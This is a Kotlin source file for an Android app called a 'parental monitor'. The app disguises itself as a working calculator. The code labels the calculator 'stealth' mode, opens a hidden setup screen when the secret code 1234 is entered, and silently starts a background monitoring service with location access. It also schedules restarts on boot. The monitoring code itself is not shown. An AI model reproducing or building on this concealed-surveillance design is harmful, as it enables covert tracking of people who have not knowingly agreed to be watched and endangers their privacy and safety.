package com.redeye.parentalmonitor.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.service.MonitoringService
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.BuildConfig

class MainActivity : AppCompatActivity() {

    private lateinit var preferencesManager: PreferencesManager

    private val requiredPermissions: Array<String>
        get() = com.redeye.parentalmonitor.utils.AppPermissions.requiredPermissions

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        outState.putString("currentNumber", currentNumber)
        outState.putString("previousNumber", previousNumber)
        outState.putString("operator", operator)
        outState.putString("lastExpression", lastExpression)
        outState.putBoolean("justCalculated", justCalculated)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "DEBUG mode")

        preferencesManager = PreferencesManager.getInstance(this)

        setContentView(R.layout.activity_calculator)
        initCalculator()
        if (savedInstanceState != null) {
            currentNumber = savedInstanceState.getString("currentNumber", "")
            previousNumber = savedInstanceState.getString("previousNumber", "")
            operator = savedInstanceState.getString("operator", "")
            lastExpression = savedInstanceState.getString("lastExpression", "")
            justCalculated = savedInstanceState.getBoolean("justCalculated", false)
            updateCalculatorDisplay()
        }
        if (BuildConfig.DEBUG) {
            android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
            return
        }
        val appCtx = applicationContext
        try {
            Thread {
                try {
                    PreferencesManager.refreshInstance(appCtx)
                } catch (_: Exception) {
                }
                try {
                    preferencesManager = PreferencesManager.getInstance(appCtx)
                } catch (_: Exception) {
                }
                try {
                    runOnUiThread {
                        try {
                            if (!isFinishing && !isDestroyed) startMonitoringInBackground()
                        } catch (_: Exception) {
                        }
                    }
                } catch (_: Exception) {
                }
            }.start()
        } catch (_: Exception) {
        }
    }
    
    // ═══════════════════════════════════════════════════════════
    // CALCULATOR FUNCTIONS (RELEASE MODE - STEALTH)
    // ═══════════════════════════════════════════════════════════
    
    private var calculatorDisplay: android.widget.TextView? = null
    private var calculatorHistory: android.widget.TextView? = null
    private var currentNumber = ""
    private var operator = ""
    private var previousNumber = ""
    private var lastExpression = ""
    private var justCalculated = false
    
    private fun initCalculator() {
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Initializing Calculator UI")
        calculatorDisplay = findViewById(R.id.calculatorDisplay)
        calculatorHistory = findViewById(R.id.calculatorHistory)
        calculatorDisplay?.let {
            try {
                androidx.core.widget.TextViewCompat.setAutoSizeTextTypeUniformWithConfiguration(
                    it, 24, 56, 2, android.util.TypedValue.COMPLEX_UNIT_SP
                )
            } catch (_: Exception) {
            }
        }
        
        // Number buttons
        val digitViews = listOf(R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9)
        digitViews.forEachIndexed { index, viewId ->
            findViewById<android.widget.Button>(viewId)?.setOnClickListener { appendNumber(index.toString()) }
        }
        findViewById<android.widget.Button>(R.id.btnDot)?.setOnClickListener { appendNumber(".") }
        
        // Operator buttons
        findViewById<android.widget.Button>(R.id.btnPlus)?.setOnClickListener { setOperator("+") }
        findViewById<android.widget.Button>(R.id.btnMinus)?.setOnClickListener { setOperator("−") }
        findViewById<android.widget.Button>(R.id.btnMultiply)?.setOnClickListener { setOperator("×") }
        findViewById<android.widget.Button>(R.id.btnDivide)?.setOnClickListener { setOperator("÷") }
        
        // Function buttons
        findViewById<android.widget.Button>(R.id.btnEquals)?.setOnClickListener { calculate() }
        findViewById<android.widget.Button>(R.id.btnClear)?.setOnClickListener { clear() }
        
        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Calculator initialized")
    }
    
    private fun appendNumber(number: String) {
        if (justCalculated) {
            currentNumber = ""
            lastExpression = ""
            justCalculated = false
        }
        if (currentNumber == "Error") {
            currentNumber = ""
            previousNumber = ""
            operator = ""
        }
        if (number == ".") {
            if (currentNumber.contains(".")) return
            if (currentNumber.isEmpty()) {
                currentNumber = "0."
            } else {
                currentNumber += "."
            }
        } else if (currentNumber == "0") {
            currentNumber = number
        } else {
            if (currentNumber.count { it.isDigit() } >= 12) return
            currentNumber += number
        }

        updateCalculatorDisplay()
    }
    
    private fun setOperator(op: String) {
        justCalculated = false
        if (currentNumber == "Error") {
            clear()
            return
        }
        if (currentNumber.isEmpty()) return
        if (previousNumber.isNotEmpty()) {
            calculate()
            if (currentNumber == "Error" || currentNumber.isEmpty()) return
        }
        operator = op
        previousNumber = currentNumber
        currentNumber = ""
        justCalculated = false
        updateCalculatorDisplay()
    }
    
    private fun calculate() {
        if (!justCalculated && currentNumber == "1234" && previousNumber.isEmpty() && operator.isEmpty()) {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
            currentNumber = ""
            previousNumber = ""
            operator = ""
            lastExpression = ""
            justCalculated = false
            updateCalculatorDisplay()
            openSetupPage()
            return
        }
        
        if (previousNumber.isEmpty() || currentNumber.isEmpty()) return
        
        val currentStr = currentNumber
        val num1 = previousNumber.toDoubleOrNull() ?: return
        val num2 = currentStr.toDoubleOrNull() ?: return
        
        val result = when (operator) {
            "+" -> num1 + num2
            "−" -> num1 - num2
            "×" -> num1 * num2
            "÷" -> if (num2 != 0.0) num1 / num2 else Double.NaN
            else -> num2
        }

        currentNumber = formatResult(result)

        lastExpression = "$previousNumber $operator $currentStr ="
        justCalculated = true
        previousNumber = ""
        operator = ""
        updateCalculatorDisplay()
    }
    
    private fun formatResult(result: Double): String {
        if (result.isNaN() || result.isInfinite()) return "Error"
        val abs = kotlin.math.abs(result)
        if (result == kotlin.math.floor(result) && abs < 1e12) {
            return result.toLong().toString()
        }
        val floored = kotlin.math.floor(abs)
        val intDigits = if (floored < 1.0) 1 else java.math.BigDecimal.valueOf(floored).toPlainString().substringBefore('.').trimStart('-').trimStart('0').length.coerceAtLeast(1)
        if (intDigits > 12) {
            return String.format(java.util.Locale.US, "%.5E", result)
        }
        val maxScale = (12 - intDigits).coerceIn(0, 8)
        val plain = java.math.BigDecimal.valueOf(result)
            .setScale(maxScale, java.math.RoundingMode.HALF_UP)
            .stripTrailingZeros()
            .toPlainString()
        if (result != 0.0 && plain.trimStart('-') == "0") {
            return String.format(java.util.Locale.US, "%.5E", result)
        }
        if (plain.count { it.isDigit() } > 12) {
            return String.format(java.util.Locale.US, "%.5E", result)
        }
        return plain
    }

    private fun clear() {
        currentNumber = ""
        previousNumber = ""
        operator = ""
        lastExpression = ""
        justCalculated = false
        updateCalculatorDisplay()
    }

    private fun updateCalculatorDisplay() {
        calculatorDisplay?.text = when {
            currentNumber.isNotEmpty() -> currentNumber.replace("-", "−")
            previousNumber.isNotEmpty() -> previousNumber.replace("-", "−")
            else -> "0"
        }
        calculatorHistory?.text = when {
            justCalculated -> lastExpression
            operator.isNotEmpty() -> "${previousNumber.replace("-", "−")} $operator"
            else -> ""
        }
    }
    
    private fun openSetupPage() {
        try {
            startActivity(Intent(this, SetupActivity::class.java))
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to open setup", e)
            try {
                Toast.makeText(this, getString(R.string.msg_open_setup_failed, e.message ?: ""), Toast.LENGTH_SHORT).show()
            } catch (_: Exception) {
            }
        }
    }

    private fun startMonitoringInBackground() {
        try {
            try {
                preferencesManager = PreferencesManager.getInstance(applicationContext)
            } catch (_: Exception) {
            }
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
            if (!preferencesManager.isConfigured()) {
            android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
            try {
                MessageScheduler.scheduleBootRestart(this)
            } catch (_: Exception) {
            }
            return
        }
        
        if (!hasAllPermissions()) {
            android.util.Log.w("MainActivity", "Permissions missing - staying silent, grant via Setup")
            try {
                MessageScheduler.scheduleBootRestart(this)
            } catch (_: Exception) {
            }
            return
        }
        
        // Start monitoring service silently
        if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
            return
        }
        if (!hasBackgroundLocation()) {
            android.util.Log.w("MainActivity", "Background location missing - starting anyway with degraded location, grant via Setup")
        }
        if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
            try {
                startMonitoringService()
                preferencesManager.setMonitoringActive(true)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
            }
        } else {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring already running")
        }
        } catch (_: Exception) {
        }
    }
    
    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.filter { it != Manifest.permission.POST_NOTIFICATIONS }.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun startMonitoringService() {
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Creating service intent...")
        val intent = Intent(this, MonitoringService::class.java).apply {
            action = MonitoringService.ACTION_START_MONITORING
        }

        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Starting service...")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as foreground service")
            } else {
                startService(intent)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as regular service")
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to start service", e)
            throw e
        }
    }

}
